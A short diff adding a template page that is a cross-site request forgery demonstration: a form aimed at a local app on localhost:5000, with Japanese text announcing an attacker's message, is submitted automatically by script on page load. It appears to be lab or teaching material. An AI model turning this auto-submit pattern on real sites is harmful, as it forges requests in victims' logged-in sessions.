@@ -1,0 +1,12 @@
+: cascade base
+: around content -> {
+<form action="http://localhost:5000/" method="POST">
+    <input name="title" value="攻撃者からのメッセージ">
+    <input name="body" value="脆弱性あるね！">
+</form>
+<script>
+    document.body.onload = function () {
+        $('form')[0].submit();
+    }
+</script>
+: }
